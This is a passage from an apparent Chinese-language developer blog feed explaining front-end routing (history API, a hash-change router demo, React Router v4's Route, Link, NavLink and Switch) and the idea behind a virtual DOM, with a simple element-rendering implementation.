title="replaceState"></a>replaceState</h5><p>该接口与pushState参数相同，含义也相同。唯一的区别在于replaceState是替换浏览器历史堆栈的当前历史记录为设定的url。需要注意的是，replaceState不会改动浏览器历史堆栈的当前指针。length不会变。</p><h5 id="onpopstate"><a href="#onpopstate" class="headerlink" title="onpopstate"></a>onpopstate</h5><p>该事件是window的属性。该事件会在调用浏览器的前进、后退以及执行history.forward、history.back、和history.go触发，因为这些操作有一个共性，即修改了历史堆栈的当前指针。在不改变document的前提下，一旦当前指针改变则会触发onpopstate事件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">        &lt;ul&gt;</span><br><span class="line">            &lt;li&gt;&lt;a href=&quot;#/&quot;&gt;turn white&lt;/a&gt;&lt;/li&gt; </span><br><span class="line">            &lt;li&gt;&lt;a href=&quot;#/blue&quot;&gt;turn blue&lt;/a&gt;&lt;/li&gt; </span><br><span class="line">            &lt;li&gt;&lt;a href=&quot;#/green&quot;&gt;turn green&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">        &lt;/ul&gt;</span><br><span class="line">    &lt;/div&gt; </span><br><span class="line">&lt;script&gt;</span><br><span class="line">    function Router() &#123;</span><br><span class="line">        this.routes = &#123;&#125;;</span><br><span class="line">        this.currentUrl = &apos;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">    Router.prototype.addRoute = function(path, callback) &#123;</span><br><span class="line">        this.routes[path] = callback || function()&#123;&#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">    Router.prototype.refresh = function(e) &#123;</span><br><span class="line">        this.currentUrl = location.hash.slice(1) || &apos;/&apos;;</span><br><span class="line">        console.log(e.oldURL , e.newURL);</span><br><span class="line">        this.routes[this.currentUrl]();</span><br><span class="line">    &#125;;</span><br><span class="line">    Router.prototype.init = function() &#123;</span><br><span class="line">        window.addEventListener(&apos;load&apos;, this.refresh.bind(this), false);</span><br><span class="line">        window.addEventListener(&apos;hashchange&apos;, this.refresh.bind(this), false);</span><br><span class="line">    &#125;</span><br><span class="line">    window.Router = new Router();</span><br><span class="line">    window.Router.init();</span><br><span class="line">    let content = document.querySelector(&apos;div&apos;);</span><br><span class="line">    </span><br><span class="line">    function changeBgColor(color) &#123;</span><br><span class="line">        content.style.backgroundColor = color;</span><br><span class="line">    &#125;</span><br><span class="line">    Router.addRoute(&apos;/&apos;, function() &#123;</span><br><span class="line">        changeBgColor(&apos;white&apos;);</span><br><span class="line">    &#125;);</span><br><span class="line">    Router.addRoute(&apos;/blue&apos;, function() &#123;</span><br><span class="line">        changeBgColor(&apos;blue&apos;);</span><br><span class="line">    &#125;);</span><br><span class="line">    Router.addRoute(&apos;/green&apos;, function() &#123;</span><br><span class="line">        changeBgColor(&apos;green&apos;);</span><br><span class="line">    &#125;);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure><h3 id="React-Router"><a href="#React-Router" class="headerlink" title="React Router ?"></a>React Router ?</h3><p>完整的 React 路由解决方案</p><h4 id="React-Router-简介相关"><a href="#React-Router-简介相关" class="headerlink" title="React Router 简介相关"></a>React Router 简介相关</h4><p>恩，是v4</p><ul><li>3.x 版本相比于 2.x 并没有引入任何新的特性，只是将 2.x 版本中部分废弃 API 的 warning 移除掉而已。V4版本相对V2/V3几乎完全重写了，遵循 Just Component 的 API 设计理念。</li></ul><ul><li>React Router 保持 UI 与 URL 同步。它拥有简单的 API 与强大的功能。例如代码缓冲加载、动态路由匹配、以及建立正确的位置过渡处理。</li></ul><p>react-router V4 分成了三个包：react-router-dom(for web)、react-router-native(for #native)、react-router(core)。react-router提供核心的路由组件与函数。其余两个则提供运行环境（即浏览器与react-native）所需的特定组件。在浏览器中，我们只需使用react-router-dom。</p><p>###主要组件</p><h4 id="Router"><a href="#Router" class="headerlink" title="Router"></a>Router</h4><p>在4.0之前版本的 API 中，Router 组件的 children 只能是 React Router 提供的各种组件，如Route、IndexRoute、Redirect等。而在 React Router 4 中，你可以将各种组件及标签放进 Router组件中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">// 示例1</span><br><span class="line">&lt;Router&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &lt;ul&gt;</span><br><span class="line">        &lt;li&gt;&lt;Link to=&quot;/&quot;&gt;首页&lt;/Link&gt;&lt;/li&gt;</span><br><span class="line">        &lt;li&gt;&lt;Link to=&quot;/about&quot;&gt;关于&lt;/Link&gt;&lt;/li&gt;</span><br><span class="line">        &lt;li&gt;&lt;Link to=&quot;/topics&quot;&gt;主题列表&lt;/Link&gt;&lt;/li&gt;</span><br><span class="line">      &lt;/ul&gt;</span><br><span class="line">      &lt;Route exact path=&quot;/&quot; component=&#123;Home&#125;/&gt;</span><br><span class="line">      &lt;Route path=&quot;/about&quot; component=&#123;About&#125;/&gt;</span><br><span class="line">      &lt;Route path=&quot;/topics&quot; component=&#123;Topics&#125;/&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/Router&gt;</span><br></pre></td></tr></table></figure><p>Router是所有路由组件共用的底层接口，一般我们的应用并不会使用这个接口，而是使用高级的路由：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;BrowserRouter&gt;：使用 HTML5 提供的 history API 来保持 UI 和 URL 的同步；</span><br><span class="line">&lt;HashRouter&gt;：使用 URL 的 hash (例如：window.location.hash) 来保持 UI 和 URL 的同步；</span><br><span class="line">&lt;MemoryRouter&gt;：能在内存保存你 “URL” 的历史纪录(并没有对地址栏读写)；</span><br><span class="line">&lt;NativeRouter&gt;：为使用React Native提供路由支持；</span><br><span class="line">&lt;StaticRouter&gt;：从不会改变地址；</span><br></pre></td></tr></table></figure><p>TIPS：和之前的Router不一样，这里<router>组件下只允许存在一个子元素</router></p><h3 id="Route"><a href="#Route" class="headerlink" title="Route"></a>Route</h3><p>Route组件主要的作用就是当一个location匹配路由的path时，渲染某些UI。如果不匹配，路由不会进行任何操作。<br><br></p><p>Route 组件有如下属性：</p><blockquote></blockquote><p>path（string）: 路由匹配路径。（没有path属性的Route 总是会 匹配）；<br>exact（bool）：为true时，则要求路径与location.pathname必须完全匹配；<br>strict（bool）：true的时候，有结尾斜线的路径只能匹配有斜线的location.pathname；</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;Route path=&quot;/hello/:name&quot;&gt;</span><br><span class="line">// 匹配 /hello/michael</span><br><span class="line">// 匹配 /hello/ryan</span><br><span class="line"></span><br><span class="line">&lt;Route path=&quot;/hello(/:name)&quot;&gt;</span><br><span class="line">// 匹配 /hello</span><br><span class="line">// 匹配 /hello/michael</span><br><span class="line">// 匹配 /hello/ryan</span><br><span class="line"></span><br><span class="line">&lt;Route path=&quot;/files/*.*&quot;&gt;</span><br><span class="line">// 匹配 /files/hello.jpg</span><br><span class="line">// 匹配 /files/hello.html</span><br><span class="line"></span><br><span class="line">&lt;Route path=&quot;/files/*&quot;&gt;</span><br><span class="line">// 匹配 /files/ </span><br><span class="line">// 匹配 /files/a</span><br><span class="line">// 匹配 /files/a/b</span><br><span class="line"></span><br><span class="line">&lt;Route path=&quot;/**/*.jpg&quot;&gt;</span><br><span class="line">// 匹配 /files/hello.jpg</span><br><span class="line">// 匹配 /files/path/to/file.jpg</span><br></pre></td></tr></table></figure><p><img src="/imgs/关于前端路由的一些事/pipeiguize.png" alt></p><h5 id="匹配路径"><a href="#匹配路径" class="headerlink" title="匹配路径"></a>匹配路径</h5><p>path-to-regexp包用来决定route元素的path参数与当前location是否匹配。它将路径字符串编译成正则表达式，并与当前location的路径名进行匹配比较。<br>当路由地址匹配成功后，会创建一个含有以下属性的match对象：</p><ul><li><p>url ：与当前location路径名所匹配部分</p></li><li><p>path ：路由的地址</p></li><li><p>isExact ：path 是否等于 pathname</p></li><li><p>params ：从path-to-regexp获取的路径中取出的值都被包含在这个对象中</p></li></ul><p>例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;Route path=&apos;/roster&apos;/&gt;</span><br><span class="line">// 当路径名为&apos;/&apos;时, path不匹配</span><br><span class="line">// 当路径名为&apos;/roster&apos;或&apos;/roster/2&apos;时, path匹配</span><br><span class="line">// 当你只想匹配&apos;/roster&apos;时，你需要使用&quot;exact&quot;参数</span><br><span class="line">// 则路由仅匹配&apos;/roster&apos;而不会匹配&apos;/roster/2&apos;</span><br><span class="line">&lt;Route exact path=&apos;/roster&apos;/&gt;</span><br></pre></td></tr></table></figure><blockquote><p>注意：在匹配路由时，React Router只关注location的路径名。当URL如下时：<br>http:/xxx/xx/x/a?extra=false<br>React Router去匹配的只是’/xxx/xx/x/a’这一部分。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;Router&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;Route exact path=&quot;/&quot; component=&#123;Home&#125;/&gt;</span><br><span class="line">    &lt;Route path=&quot;/news&quot; component=&#123;News&#125;/&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/Router&gt;</span><br><span class="line"></span><br><span class="line">// 如果应用的地址是/,那么相应的UI会类似这个样子：</span><br><span class="line">&lt;div&gt;</span><br><span class="line">  &lt;Home/&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">// 如果应用的地址是/news,那么相应的UI就会成为这个样子：</span><br><span class="line">&lt;div&gt;</span><br><span class="line">  &lt;News/&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><p>新版的路由为Route提供了三种渲染内容的方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;Route component&gt;：在地址匹配的时候React的组件才会被渲染，route props也会随着一起被渲染；</span><br><span class="line">&lt;Route render&gt;：这种方式对于内联渲染和包装组件却不引起意料之外的重新挂载特别方便；</span><br><span class="line">&lt;Route children&gt;：与render属性的工作方式基本一样，除了它是不管地址匹配与否都会被调用；</span><br><span class="line">?</span><br></pre></td></tr></table></figure><p>例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">// 行内渲染示例</span><br><span class="line">&lt;Route path=&quot;/home&quot; render=&#123;() =&gt; &lt;div&gt;Home&lt;/div&gt;&#125;/&gt;</span><br><span class="line"></span><br><span class="line">// 包装/合成</span><br><span class="line">const FadingRoute = (&#123; component: Component, ...rest &#125;) =&gt; (</span><br><span class="line">  &lt;Route &#123;...rest&#125; render=&#123;props =&gt; (</span><br><span class="line">    &lt;FadeIn&gt;</span><br><span class="line">      &lt;Component &#123;...props&#125;/&gt;</span><br><span class="line">    &lt;/FadeIn&gt;</span><br><span class="line">  )&#125;/&gt;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">&lt;FadingRoute path=&quot;/cool&quot; component=&#123;Something&#125;/&gt;</span><br></pre></td></tr></table></figure><p>Route component 的优先级要比 Route render高，所以不要在同一个Route中同时使用这两个属性。</p><ul><li>最后：你可以把Route组件放在任意你想要路由渲染的地方</li></ul><p>###Link<br>重点看下组件属性</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">to（string/object）：要跳转的路径或地址；</span><br><span class="line">replace（bool）：为 true 时，点击链接后将使用新地址替换掉访问历史记录里面的原地址；为 false 时，点击链接后将在原有访问历史记录的基础上添加一个新的纪录。默认为 false；</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">// Link组件示例</span><br><span class="line"></span><br><span class="line">// to为string</span><br><span class="line">&lt;Link to=&quot;/about&quot;&gt;关于&lt;/Link&gt;</span><br><span class="line"></span><br><span class="line">// to为obj</span><br><span class="line">&lt;Link to=&#123;&#123;</span><br><span class="line">  pathname: &apos;/courses&apos;,</span><br><span class="line">  search: &apos;?sort=name&apos;,</span><br><span class="line">  hash: &apos;#the-hash&apos;,</span><br><span class="line">  state: &#123; fromDashboard: true &#125;</span><br><span class="line">&#125;&#125;/&gt;</span><br><span class="line"></span><br><span class="line">// replace </span><br><span class="line">&lt;Link to=&quot;/courses&quot; replace /&gt;</span><br></pre></td></tr></table></figure><p>###NavLink<br>NavLink是Link的一个特定版本, 会在匹配上当前 URL 的时候会给已经渲染的元素添加样式参数，组件属性：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">activeClassName（string）：设置选中样式，默认值为 active；</span><br><span class="line">activeStyle（object）：当元素被选中时, 为此元素添加样式；</span><br><span class="line">exact（bool）：为 true 时, 只有当地址完全匹配 class 和 style 才会应用；</span><br><span class="line">strict（bool）：为 true 时，在确定位置是否与当前 URL 匹配时，将考虑位置 pathname 后的斜线；</span><br><span class="line">isActive（func）：判断链接是否激活的额外逻辑的功能；</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">// activeClassName选中时样式为selected</span><br><span class="line">&lt;NavLink</span><br><span class="line">  to=&quot;/faq&quot;</span><br><span class="line">  activeClassName=&quot;selected&quot;</span><br><span class="line">&gt;FAQs&lt;/NavLink&gt;</span><br><span class="line"></span><br><span class="line">// 选中时样式为activeStyle的样式设置</span><br><span class="line">&lt;NavLink</span><br><span class="line">  to=&quot;/faq&quot;</span><br><span class="line">  activeStyle=&#123;&#123;</span><br><span class="line">    fontWeight: &apos;bold&apos;,</span><br><span class="line">    color: &apos;red&apos;</span><br><span class="line">   &#125;&#125;</span><br><span class="line">&gt;FAQs&lt;/NavLink&gt;</span><br><span class="line"></span><br><span class="line">// 当event id为奇数的时候，激活链接</span><br><span class="line">const oddEvent = (match, location) =&gt; &#123;</span><br><span class="line">  if (!match) &#123;</span><br><span class="line">    return false</span><br><span class="line">  &#125;</span><br><span class="line">  const eventID = parseInt(match.params.eventID)</span><br><span class="line">  return !isNaN(eventID) &amp;&amp; eventID % 2 === 1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;NavLink</span><br><span class="line">  to=&quot;/events/123&quot;</span><br><span class="line">  isActive=&#123;oddEvent&#125;</span><br><span class="line">&gt;Event 123&lt;/NavLink&gt;</span><br></pre></td></tr></table></figure><h3 id="Switch"><a href="#Switch" class="headerlink" title="Switch"></a>Switch</h3><p>该组件用来渲染匹配地址的第一个Route或者Redirect。那么它与使用一堆route又有什么区别呢？</p><p>Switch的独特之处是独它仅仅渲染一个路由。相反地，每一个包含匹配地址(location)的 Route都会被渲染。思考下面的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;Route path=&quot;/about&quot; component=&#123;About&#125;/&gt;</span><br><span class="line">&lt;Route path=&quot;/:user&quot; component=&#123;User&#125;/&gt;</span><br><span class="line">&lt;Route component=&#123;NoMatch&#125;/&gt;</span><br></pre></td></tr></table></figure><ul><li>如果现在的URL是/about，那么 About,  User, 还有 NoMatch都会被渲染，因为它们都与路径(path)匹配。这种设计，允许我们以多种方式将多个 Route组合到我们的应用程序中，例如侧栏(sidebars)，面包屑(breadcrumbs)，bootstrap tabs等等。 然而，偶尔我们只想选择一个Route来渲染。如果我们现在处于/about，我们也不希望匹配/:user（或者显示我们的 “404” 页面 ）。以下是使用 Switch 的方法来实现：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;Switch&gt;</span><br><span class="line">  &lt;Route exact path=&quot;/&quot; component=&#123;Home&#125;/&gt;</span><br><span class="line">  &lt;Route path=&quot;/about&quot; component=&#123;About&#125;/&gt;</span><br><span class="line">  &lt;Route path=&quot;/:user&quot; component=&#123;User&#125;/&gt;</span><br><span class="line">  &lt;Route component=&#123;NoMatch&#125;/&gt;</span><br><span class="line">&lt;/Switch&gt;</span><br></pre></td></tr></table></figure><ul><li>现在，如果我们处于/about，Switch将开始寻找匹配的Route。Route path=”/about”  将被匹配， Switch将停止寻找匹配并渲染About。同样，如果我们处于/michael，User将被渲染。</li></ul><ul><li>通过Route路由的组件，可以拿到一个match参数，这个参数是一个对象，其中包含几个数据：<br><br>isExact：刚才已经说过这个关键字，表示是为作全等匹配<br>params：path中包含的一些额外数据<br>path：Route组件path属性的值<br>url：实际url的hash值</li></ul><p><img src="/imgs/关于前端路由的一些事/match.png" alt></p><p><br></p><p>###v3 与 v4 的一些区别<br>在react-router v3中，仅有一个Router 组件，需要提供 history 对象作为他的属性 (prop)。</p><p>此外，可以使用 routes 作为 Router 的属性 (prop) 或者作为 children 的方式来定义程序的路由结构。</p><p>在v4中，没有集中的路由配置。任何需要根据路由渲染内容的地方，只需渲染一个 Route 组件  router 组件只能被赋予一个子元素</p><p>react-router v3 提供 onEnter, onUpdate, and onLeave 方法。这些方法本质上是重写（覆盖）了 react 生命周期方法。使用 v4，你将会使用生命周期方法 通过 Route 渲染的组件，你可以使用 componentDidMount 或 componentWillMount 代替 onEnter，你可以使用 componentDidUpdate 或者 componentWillUpdate (更或者 componentWillReceiveProps) 代替 onUpdate，你可以使用 componentWillUnmount 代替 onLeave。</p><p>v4 的Switch组件，当 Switch 被渲染时，它仅会渲染与当前路径匹配的第一个子 Route。</p><p>…<br>还有很多区别</p><h3 id="and"><a href="#and" class="headerlink" title="and"></a>and</h3><p><a href="http://www.baidu.com/link?url=iUqZ8qoki-EPuX4LUXguiJ148mao0sYdb0qjVExb8eHXw_LtydvYYEMBWSzuLuLtupDvzONFn7YlZyyKNLJ8Aq" target="_blank" rel="noopener">麻烦的按需加载</a></p><p><a href="https://github.com/cheft/minrouter" target="_blank" rel="noopener">minrouter</a> 用于同构javaScript Web应用程序的微型中间件路由器</p><p><a href="https://react-guide.github.io/react-router-cn/" target="_blank" rel="noopener">React Router 中文</a></p><p><a href="https://www.zcfy.cc/article/react-router-v4-the-complete-guide-mdash-sitepoint-4448.html" target="_blank" rel="noopener">React Router v4 版本 完全指北</a></p><p><a href="https://github.com/YutHelloWorld/Blog/issues/4" target="_blank" rel="noopener">v2 v3 到 v4 版本的迁移</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;##关于前端路由的一些事&lt;/p&gt;
&lt;h3 id=&quot;路由实现&quot;&gt;&lt;a href=&quot;#路由实现&quot; class=&quot;headerlink&quot; title=&quot;路由实现&quot;&gt;&lt;/a&gt;路由实现&lt;/h3&gt;&lt;h4 id=&quot;一、hashchange&quot;&gt;&lt;a href=&quot;#一、hashchange&quot;
      
    
    </summary>
    
    
      <category term="技术" scheme="http://swingboy.github.io/tags/%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>visual dom</title>
    <link href="http://swingboy.github.io/2018/03/05/visual-dom/"/>
    <id>http://swingboy.github.io/2018/03/05/visual-dom/</id>
    <published>2018-03-05T15:48:14.000Z</published>
    <updated>2020-04-24T03:18:29.987Z</updated>
    
    <content type="html"><![CDATA[<p>####引言<br>我们知道，DOM 操作真正的问题在于每次操作都会触发布局的改变、DOM树的修改和渲染。所以，当你一个接一个地去修改30个节点的时候，就会引起N次（潜在的）布局重算，N次（潜在的）重绘，等等。</p><h4 id="二、什么是虚拟DOM？"><a href="#二、什么是虚拟DOM？" class="headerlink" title="二、什么是虚拟DOM？"></a>二、什么是虚拟DOM？</h4><p>虚拟DOM是在DOM的基础上建立了一个抽象层，对数据和状态所做的任何改动，都会被自动且高效的同步到虚拟DOM，最后再批量同步到DOM中。</p><p>Virtual DOM 实际上没有使用什么全新的技术，仅仅是把 “ 双缓冲（double buffering）” 技术应用到了DOM上面。<br>这样一来，当你在这个单独的虚拟的DOM树上也一个接一个地修改30个节点的时候，它不会每次都去触发重绘，所以修改节点的开销就变小了。<br>之后，一旦你要把这些改动传递给真实DOM，之前所有的改动就会整合成一次DOM操作。这一次DOM操作引起的布局计算和重绘可能会更大，但是相比而言，整合起来的改动只做一次，减少了（多次）计算。</p><p>虚拟DOM是React等的一大亮点，具有batching(批处理)和高效的Diff算法。这让我们可以无需担心性能问题而”毫无顾忌”的随时“刷新”整个页面，由虚拟DOM来确保只对界面上真正变化的部分进行实际的DOM操作。</p><p><img src="/imgs/visualdom/20170504161311010.png" alt><br><br><br><br><br><img src="/imgs/visualdom/20170504161319670.png" alt></p><p><br></p><p>innerHTML：render html字符串 + 重新创建所有 DOM 元素</p><p>虚拟DOM：render 虚拟DOM + diff + 更新必要的 DOM 元素</p><p><br></p><h4 id="虚拟DOM的优点："><a href="#虚拟DOM的优点：" class="headerlink" title="虚拟DOM的优点："></a>虚拟DOM的优点：</h4><p>最终表现在DOM上的修改只是变更的部分，可以保证非常高效的渲染。</p><p>####虚拟DOM的缺点：<br>首次渲染大量DOM时，由于多了一层虚拟DOM的计算，会比innerHTML插入慢。</p><h4 id="原理"><a href="#原理" class="headerlink" title="原理:"></a>原理:</h4><p>React会在内存中维护一个虚拟DOM树，对这个树进行读或写，实际上是对虚拟DOM进行。当数据变化时，会自动更新虚拟DOM，然后将新的虚拟DOM和旧的虚拟DOM进行对比，找到变更的部分，得出一个diff，然后将diff放到一个队列里，最终批量更新这些diff到DOM中。</p><h6 id="步骤一：用JS对象模拟DOM树"><a href="#步骤一：用JS对象模拟DOM树" class="headerlink" title="步骤一：用JS对象模拟DOM树 "></a>步骤一：用JS对象模拟DOM树 <br></h6><h6 id="步骤二：比较两棵虚拟DOM树的差异"><a href="#步骤二：比较两棵虚拟DOM树的差异" class="headerlink" title="步骤二：比较两棵虚拟DOM树的差异"></a>步骤二：比较两棵虚拟DOM树的差异<br></h6><h6 id="步骤三：把差异应用到真正的DOM树上"><a href="#步骤三：把差异应用到真正的DOM树上" class="headerlink" title="步骤三：把差异应用到真正的DOM树上 "></a>步骤三：把差异应用到真正的DOM树上 <br></h6><p><img src="/imgs/visualdom/20170504161331322.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">//模拟dom</span><br><span class="line">function Element(tagName, props, children) &#123;</span><br><span class="line">  this.tagName = tagName</span><br><span class="line">  this.props = props</span><br><span class="line">  this.children = children</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module.exports = function (tagName, props, children) &#123;</span><br><span class="line">  return new Element(tagName, props, children)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//渲染</span><br><span class="line">Element.prototype.render = function () &#123;</span><br><span class="line">  var el = document.createElement(this.tagName) // 根据tagName构建</span><br><span class="line">  var props = this.props</span><br><span class="line"></span><br><span class="line">  for (var propName in props) &#123; // 设置节点的DOM属性</span><br><span class="line">    var propValue = props[propName]</span><br><span class="line">    el.setAttribute(propName, propValue)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  var children = this.children || []</span><br><span class="line"></span><br><span class="line">  children.forEach(function (child) &#123;</span><br><span class="line">    var childEl = (child instanceof Element)</span><br><span class="line">      ? child.render() // 如果子节点也是虚拟DOM，递归构建DOM节点</span><br><span class="line">      : document.createTextNode(child) // 如果字符串，只构建文本节点</span><br><span class="line">    el.appendChild(childEl)</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  return el</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><p style="color:blue;">例如上面的 DOM 结构就可以简单的表示：</p><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var el = require(&apos;./element&apos;);</span><br><span class="line">var ul = el(&apos;ul&apos;, &#123;id: &apos;list&apos;&#125;, [</span><br><span class="line">  el(&apos;li&apos;, &#123;class: &apos;item&apos;&#125;, [&apos;Item 1&apos;]),</span><br><span class="line">  el(&apos;li&apos;, &#123;class: &apos;item&apos;&#125;, [&apos;Item 2&apos;]),</span><br><span class="line">  el(&apos;li&apos;, &#123;class: &apos;item&apos;&#125;, [&apos;Item 3&apos;])</span><br><span class="line">])</span><br></pre></td></tr></table></figure><p></p><p>注：在前端当中，你很少会跨越层级地移动DOM元素。所以 Virtual DOM 只会对同一个层级的元素进行对比，上面的div只会和同一层级的div对比，第二层级的只会跟第二层级对比。这样算法复杂度就可以达到 O(n)。</p><p><img src="/imgs/visualdom/6d64b0b7889e7f020bb020aea5947a09_hd.jpg" alt></p><h4 id="1-深度优先遍历，记录差异"><a href="#1-深度优先遍历，记录差异" class="headerlink" title="(1)深度优先遍历，记录差异"></a>(1)深度优先遍历，记录差异</h4><p><img src="/imgs/visualdom/c4ba535164d29fd46383d19512c37349_hd.jpg" alt></p><p>在深度优先遍历的时候，每遍历到一个节点就把该节点和新的的树进行对比。如果有差异的话就记录到一个对象里面。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 